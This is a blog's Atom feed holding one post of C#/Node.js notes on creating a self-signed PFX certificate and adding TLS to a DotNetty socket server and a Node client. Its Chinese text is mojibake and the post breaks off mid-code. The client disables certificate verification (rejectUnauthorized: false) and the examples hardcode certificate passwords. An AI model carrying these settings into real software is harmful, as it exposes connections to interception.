<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M Study Log</title>
  
  
  <link href="https://banjinmei.github.io/atom.xml" rel="self"/>
  
  <link href="https://banjinmei.github.io/"/>
  <updated>2025-02-12T17:21:06.916Z</updated>
  <id>https://banjinmei.github.io/</id>
  
  <author>
    <name>m</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>socket ssl tls</title>
    <link href="https://banjinmei.github.io/2025/02/13/socket-ssl-tls/"/>
    <id>https://banjinmei.github.io/2025/02/13/socket-ssl-tls/</id>
    <published>2025-02-12T17:12:50.000Z</published>
    <updated>2025-02-12T17:21:06.916Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C-ç”Ÿæˆè¯ä¹¦"><a href="#C-ç”Ÿæˆè¯ä¹¦" class="headerlink" title="C#ç”Ÿæˆè¯ä¹¦"></a>C#ç”Ÿæˆè¯ä¹¦</h1><p>åœ¨ C# ä¸­ç”Ÿæˆ .pfx è¯ä¹¦æ–‡ä»¶ï¼Œé€šå¸¸å¯ä»¥å€ŸåŠ© System.Security.Cryptography å‘½åç©ºé—´ä¸‹çš„ç±»æ¥å®ç°ã€‚ä»¥ä¸‹ä¸ºè¯¦ç»†æ­¥éª¤å’Œç¤ºä¾‹ä»£ç ï¼š</p><h2 id="åˆ›å»ºè‡ªç­¾åè¯ä¹¦"><a href="#åˆ›å»ºè‡ªç­¾åè¯ä¹¦" class="headerlink" title="åˆ›å»ºè‡ªç­¾åè¯ä¹¦"></a>åˆ›å»ºè‡ªç­¾åè¯ä¹¦</h2><p>åˆ©ç”¨ RSA ç®—æ³•ç”Ÿæˆå¯†é’¥å¯¹ï¼Œå†ä½¿ç”¨ CertificateRequest ç±»åˆ›å»ºè‡ªç­¾åè¯ä¹¦è¯·æ±‚ï¼Œæœ€åç”Ÿæˆè‡ªç­¾åè¯ä¹¦ã€‚<br>å°†è¯ä¹¦ä¿å­˜ä¸º .pfx æ–‡ä»¶ï¼šä½¿ç”¨ X509Certificate2 ç±»æŠŠç”Ÿæˆçš„è¯ä¹¦å’Œç§é’¥ä¿å­˜ä¸º .pfx æ–‡ä»¶ã€‚</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pusing System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography.X509Certificates;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ç”ŸæˆRSAå¯†é’¥å¯¹</span></span><br><span class="line">        <span class="keyword">using</span> (RSA rsa = RSA.Create(<span class="number">2048</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// åˆ›å»ºè¯ä¹¦è¯·æ±‚</span></span><br><span class="line">            <span class="keyword">var</span> certificateRequest = <span class="keyword">new</span> CertificateRequest(</span><br><span class="line">                <span class="string">&quot;CN=MySelfSignedCertificate&quot;</span>,</span><br><span class="line">                rsa,</span><br><span class="line">                HashAlgorithmName.SHA256,</span><br><span class="line">                RSASignaturePadding.Pkcs1);</span><br><span class="line">            <span class="comment">// è®¾ç½®è¯ä¹¦æ‰©å±•</span></span><br><span class="line">            certificateRequest.CertificateExtensions.Add(</span><br><span class="line">                <span class="keyword">new</span> X509BasicConstraintsExtension(<span class="literal">true</span>, <span class="literal">false</span>, <span class="number">0</span>, <span class="literal">true</span>));</span><br><span class="line">            certificateRequest.CertificateExtensions.Add(</span><br><span class="line">                <span class="keyword">new</span> X509KeyUsageExtension(</span><br><span class="line">                    X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment,</span><br><span class="line">                    <span class="literal">false</span>));</span><br><span class="line">            <span class="comment">// ç”Ÿæˆè‡ªç­¾åè¯ä¹¦</span></span><br><span class="line">            <span class="keyword">var</span> certificate = certificateRequest.CreateSelfSigned(</span><br><span class="line">                DateTimeOffset.UtcNow.AddDays(<span class="number">-1</span>),</span><br><span class="line">                DateTimeOffset.UtcNow.AddDays(<span class="number">365</span>));</span><br><span class="line">            <span class="comment">// ä¿å­˜ä¸ºPFXæ–‡ä»¶</span></span><br><span class="line">            <span class="built_in">string</span> pfxFilePath = <span class="string">&quot;MyCertificate.pfx&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> pfxPassword = <span class="string">&quot;MyPassword123&quot;</span>;</span><br><span class="line">            <span class="built_in">byte</span>[] pfxBytes = certificate.Export(X509ContentType.Pfx, pfxPassword);</span><br><span class="line">            File.WriteAllBytes(pfxFilePath, pfxBytes);</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;PFXæ–‡ä»¶å·²ç”Ÿæˆ: <span class="subst">&#123;pfxFilePath&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç”Ÿæˆ-RSA-å¯†é’¥å¯¹ï¼š"><a href="#ç”Ÿæˆ-RSA-å¯†é’¥å¯¹ï¼š" class="headerlink" title="ç”Ÿæˆ RSA å¯†é’¥å¯¹ï¼š"></a>ç”Ÿæˆ RSA å¯†é’¥å¯¹ï¼š</h2><p>csharpusing (RSA rsa &#x3D; RSA.Create(2048))<br>{<br>    &#x2F;&#x2F; â€¦<br>}<br>è¿ç”¨ RSA.Create(2048) æ–¹æ³•ç”Ÿæˆä¸€ä¸ª 2048 ä½çš„ RSA å¯†é’¥å¯¹ã€‚</p><h2 id="åˆ›å»ºè¯ä¹¦è¯·æ±‚ï¼š"><a href="#åˆ›å»ºè¯ä¹¦è¯·æ±‚ï¼š" class="headerlink" title="åˆ›å»ºè¯ä¹¦è¯·æ±‚ï¼š"></a>åˆ›å»ºè¯ä¹¦è¯·æ±‚ï¼š</h2><p>csharpvar certificateRequest &#x3D; new CertificateRequest(<br>    â€œCN&#x3D;MySelfSignedCertificateâ€,<br>    rsa,<br>    HashAlgorithmName.SHA256,<br>    RSASignaturePadding.Pkcs1);<br>å€ŸåŠ© CertificateRequest ç±»åˆ›å»ºä¸€ä¸ªè¯ä¹¦è¯·æ±‚ï¼ŒæŒ‡å®šè¯ä¹¦çš„ä¸»é¢˜åç§°ã€å¯†é’¥å¯¹ã€å“ˆå¸Œç®—æ³•å’Œç­¾åå¡«å……æ–¹å¼ã€‚</p><h2 id="è®¾ç½®è¯ä¹¦æ‰©å±•ï¼š"><a href="#è®¾ç½®è¯ä¹¦æ‰©å±•ï¼š" class="headerlink" title="è®¾ç½®è¯ä¹¦æ‰©å±•ï¼š"></a>è®¾ç½®è¯ä¹¦æ‰©å±•ï¼š</h2><p>csharpcertificateRequest.CertificateExtensions.Add(<br>    new X509BasicConstraintsExtension(true, false, 0, true));<br>certificateRequest.CertificateExtensions.Add(<br>    new X509KeyUsageExtension(<br>        X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment,<br>        false));<br>ä¸ºè¯ä¹¦è¯·æ±‚æ·»åŠ åŸºæœ¬çº¦æŸå’Œå¯†é’¥ä½¿ç”¨æ‰©å±•ã€‚</p><h2 id="ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ï¼š"><a href="#ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ï¼š" class="headerlink" title="ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ï¼š"></a>ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ï¼š</h2><p>csharpvar certificate &#x3D; certificateRequest.CreateSelfSigned(<br>    DateTimeOffset.UtcNow.AddDays(-1),<br>    DateTimeOffset.UtcNow.AddDays(365));<br>è°ƒç”¨ CreateSelfSigned æ–¹æ³•ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ï¼ŒæŒ‡å®šè¯ä¹¦çš„æœ‰æ•ˆæœŸã€‚</p><h2 id="ä¿å­˜ä¸º-pfx-æ–‡ä»¶ï¼š"><a href="#ä¿å­˜ä¸º-pfx-æ–‡ä»¶ï¼š" class="headerlink" title="ä¿å­˜ä¸º .pfx æ–‡ä»¶ï¼š"></a>ä¿å­˜ä¸º .pfx æ–‡ä»¶ï¼š</h2><p>csharpstring pfxFilePath &#x3D; â€œMyCertificate.pfxâ€;<br>string pfxPassword &#x3D; â€œMyPassword123â€;<br>byte[] pfxBytes &#x3D; certificate.Export(X509ContentType.Pfx, pfxPassword);<br>File.WriteAllBytes(pfxFilePath, pfxBytes);<br>ä½¿ç”¨ Export æ–¹æ³•å°†è¯ä¹¦å’Œç§é’¥å¯¼å‡ºä¸º .pfx æ ¼å¼çš„å­—èŠ‚æ•°ç»„ï¼Œå†ä½¿ç”¨ File.WriteAllBytes æ–¹æ³•å°†å­—èŠ‚æ•°ç»„ä¿å­˜ä¸ºæ–‡ä»¶ã€‚</p><h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><p>è¦ä¿è¯è¿è¡Œä»£ç çš„ç”¨æˆ·å¯¹ä¿å­˜ .pfx æ–‡ä»¶çš„ç›®å½•å…·æœ‰å†™å…¥æƒé™ã€‚<br>å¦¥å–„ä¿ç®¡ .pfx æ–‡ä»¶å’Œå¯†ç ï¼Œå› ä¸º .pfx æ–‡ä»¶åŒ…å«ç§é’¥ï¼Œæ³„éœ²ç§é’¥ä¼šå¸¦æ¥å®‰å…¨é£é™©ã€‚</p><h2 id="è¯»å–"><a href="#è¯»å–" class="headerlink" title="è¯»å–"></a>è¯»å–</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography.X509Certificates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// .pfx è¯ä¹¦æ–‡ä»¶çš„è·¯å¾„</span></span><br><span class="line">            <span class="built_in">string</span> pfxFilePath = <span class="string">&quot;MyCertificate.pfx&quot;</span>;</span><br><span class="line">            <span class="comment">// .pfx è¯ä¹¦æ–‡ä»¶çš„å¯†ç </span></span><br><span class="line">            <span class="built_in">string</span> pfxPassword = <span class="string">&quot;MyPassword123&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è¯»å– .pfx è¯ä¹¦æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">using</span> (X509Certificate2 certificate = <span class="keyword">new</span> X509Certificate2(pfxFilePath, pfxPassword))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// è¾“å‡ºè¯ä¹¦çš„åŸºæœ¬ä¿¡æ¯</span></span><br><span class="line">                Console.WriteLine(<span class="string">&quot;è¯ä¹¦ä¿¡æ¯ï¼š&quot;</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;ä¸»é¢˜: <span class="subst">&#123;certificate.Subject&#125;</span>&quot;</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;é¢å‘è€…: <span class="subst">&#123;certificate.Issuer&#125;</span>&quot;</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;æœ‰æ•ˆæœŸå¼€å§‹æ—¶é—´: <span class="subst">&#123;certificate.NotBefore&#125;</span>&quot;</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;æœ‰æ•ˆæœŸç»“æŸæ—¶é—´: <span class="subst">&#123;certificate.NotAfter&#125;</span>&quot;</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;æŒ‡çº¹: <span class="subst">&#123;certificate.Thumbprint&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// æ£€æŸ¥è¯ä¹¦æ˜¯å¦åŒ…å«ç§é’¥</span></span><br><span class="line">                <span class="keyword">if</span> (certificate.HasPrivateKey)</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;è¯ä¹¦åŒ…å«ç§é’¥ã€‚&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;è¯ä¹¦ä¸åŒ…å«ç§é’¥ã€‚&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;è¯»å–è¯ä¹¦æ—¶å‡ºé”™: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="socket-ssl"><a href="#socket-ssl" class="headerlink" title="socket ssl"></a>socket ssl</h1><p>DotNettySocket æœåŠ¡ç«¯ä»£ç çš„åŸºç¡€ä¸Šæ·»åŠ  SSL&#x2F;TLS åŠ å¯†æ”¯æŒã€‚DotNetty æ”¯æŒ SSL&#x2F;TLSï¼Œå¯ä»¥ä½¿ç”¨ TlsHandler æ¥å®ç°ã€‚éœ€è¦åšä»¥ä¸‹ä¿®æ”¹ï¼š</p><p>å‡†å¤‡ SSL è¯ä¹¦ï¼ˆ.pfx æ–‡ä»¶ï¼‰ã€‚<br>åœ¨ TcpSocketServerBuilder é‡Œæ·»åŠ  SSL å¤„ç†å™¨ã€‚<br>ç¡®ä¿å®¢æˆ·ç«¯ä¹Ÿæ”¯æŒ SSL è¿æ¥ï¼Œå¦åˆ™è¿æ¥ä¼šå¤±è´¥ã€‚<br>ä¿®æ”¹ TcpSocketServerBuilder ä»£ç <br>åœ¨ ChildHandler çš„ ActionChannelInitializer<IChannel> é‡Œæ·»åŠ  TlsHandlerï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography.X509Certificates;</span><br><span class="line"><span class="keyword">using</span> DotNetty.Handlers.Tls;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> ITcpSocketServerBuilder <span class="title">UseSsl</span>(<span class="params"><span class="built_in">string</span> certPath, <span class="built_in">string</span> certPassword</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    _setEncoder += x =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> certificate = <span class="keyword">new</span> X509Certificate2(certPath, certPassword);</span><br><span class="line">        x.AddFirst(<span class="string">&quot;tls&quot;</span>, <span class="keyword">new</span> TlsHandler(</span><br><span class="line">            stream =&gt; <span class="keyword">new</span> SslStream(stream, <span class="literal">true</span>),</span><br><span class="line">            <span class="keyword">new</span> ServerTlsSettings(certificate)</span><br><span class="line">        ));</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ Main é‡Œçš„ SocketBuilderFactory<br>åœ¨ BuildAsync() ä¹‹å‰è°ƒç”¨ UseSslï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> theServer = <span class="keyword">await</span> SocketBuilderFactory.GetTcpSocketServerBuilder(<span class="number">6001</span>)</span><br><span class="line">    .UseSsl(<span class="string">&quot;server.pfx&quot;</span>, <span class="string">&quot;yourpassword&quot;</span>) <span class="comment">// æ·»åŠ  SSL æ”¯æŒ</span></span><br><span class="line">    .SetLengthFieldEncoder(<span class="number">2</span>)</span><br><span class="line">    .SetLengthFieldDecoder(<span class="built_in">ushort</span>.MaxValue, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">    .OnConnectionClose((server, connection) =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    &#125;).BuildAsync();</span><br></pre></td></tr></table></figure><p>è¯´æ˜ï¼š<br>UseSsl(â€œserver.pfxâ€, â€œyourpasswordâ€) éœ€è¦çš„è¯ä¹¦æ–‡ä»¶ server.pfx å’Œå¯†ç ã€‚<br>TlsHandler å¤„ç† SSL&#x2F;TLS è¿æ¥ã€‚<br>å®¢æˆ·ç«¯ä¹Ÿéœ€è¦å¯¹åº”çš„ SSL å¤„ç†ï¼Œå¦åˆ™æ— æ³•è¿æ¥ã€‚<br>è¿™æ ·ï¼ŒæœåŠ¡ç«¯å°±æ”¯æŒ SSL åŠ å¯†äº†ï¼Œå®¢æˆ·ç«¯éœ€è¦ä½¿ç”¨ SslStream è¿›è¡ŒåŠ å¯†è¿æ¥ã€‚å¦‚æœçš„å®¢æˆ·ç«¯ä¹Ÿæ˜¯åŸºäº DotNettyï¼Œéœ€è¦åœ¨ TcpSocketClientBuilder é‡Œæ·»åŠ  TlsHandlerï¼Œæ–¹å¼ç±»ä¼¼ã€‚</p><h1 id="node-socket-client"><a href="#node-socket-client" class="headerlink" title="node socket client"></a>node socket client</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> tls = <span class="built_in">require</span>(<span class="string">&#x27;tls&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CERT_PATH</span> = <span class="string">&#x27;C:/path/to/MyCertificate.pfx&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CERT_PASS</span> = <span class="string">&#x27;your_password&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">    <span class="attr">pfx</span>: fs.<span class="title function_">readFileSync</span>(<span class="variable constant_">CERT_PATH</span>),</span><br><span class="line">    <span class="attr">passphrase</span>: <span class="variable constant_">CERT_PASS</span>,</span><br><span class="line">    <span class="attr">rejectUnauthorized</span>: <span class="literal">false</span>, <span class="comment">// å…è®¸è‡ªç­¾åè¯ä¹¦</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> client = tls.<span class="title function_">connect</span>(<span class="number">6001</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>, options, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;âœ… å·²è¿æ¥åˆ°æœåŠ¡å™¨&#x27;</span>);</span><br><span class="line">    <span class="title function_">sendData</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›‘å¬æœåŠ¡å™¨æ•°æ®</span></span><br><span class="line">client.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ğŸ“© æ”¶åˆ°æœåŠ¡å™¨æ•°æ®:&#x27;</span>, data.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›‘å¬é”™è¯¯</span></span><br><span class="line">client.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;âŒ è¿æ¥é”™è¯¯:&#x27;</span>, err.<span class="property">message</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›‘å¬å…³é—­</span></span><br><span class="line">client.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ğŸ”´ è¿æ¥å·²æ–­å¼€&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// **å°è£…å‡½æ•°ï¼Œç¡®ä¿æ•°æ®æ ¼å¼æ­£ç¡®**</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sendData</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (client.<span class="property">writable</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> message = <span class="string">`â¡ï¸ å‘é€æ•°æ®: <span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toISOString()&#125;</span>`</span>;</span><br><span class="line">            <span class="keyword">const</span> msgBuffer = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(message, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// **å‰ä¸¤ä¸ªå­—èŠ‚å­˜å‚¨æ¶ˆæ¯é•¿åº¦**</span></span><br><span class="line">            <span class="keyword">const</span> lengthBuffer = <span class="title class_">Buffer</span>.<span class="title function_">alloc</span>(<span class="number">2</span>);</span><br><span class="line">            lengthBuffer.<span class="title function_">writeUInt16BE</span>(msgBuffer.<span class="property">length</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// **æ‹¼æ¥é•¿åº¦å­—æ®µ + æ•°æ®**</span></span><br><span class="line">            <span class="keyword">const</span> finalBuffer = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([lengthBuffer, msgBuffer]);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ğŸ“¤ å‘é€æ•°æ®:&#x27;</span>, message);</span><br><span class="line">            client.<span class="title function_">write</span>(finalBuffer);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;âš ï¸ è¿æ¥å·²å…³é—­ï¼Œæ— æ³•å‘é€æ•°æ®&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="socket-server"><a href="#socket-server" class="headerlink" title="socket server"></a>socket server</h1><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Coldairarrow.DotNettySocket;</span><br><span class="line"><span class="keyword">using</span> DotNetty.Handlers.Tls;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography.X509Certificates;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">TcpSocket.Server</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// åŠ è½½è¯ä¹¦</span></span><br><span class="line">            <span class="keyword">var</span> serverCertificate = <span class="keyword">new</span> X509Certificate2(Path.Combine(AppContext.BaseDirectory, <span class="string">&quot;your_certificate.pfx&quot;</span>), <span class="string">&quot;your_password&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> theServer = <span class="keyword">await</span> SocketBuilderFactory.GetTcpSocketServerBuilder(<span class="number">6001</span>)</span><br><span class="line">               .SetLengthFieldEncoder(<span class="number">2</span>)</span><br><span class="line">               .SetLengthFieldDecoder(<span class="built_in">ushort</span>.MaxValue, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">               .SetSslHandler(serverCertificate) <span class="comment">// æ·»åŠ  SSL 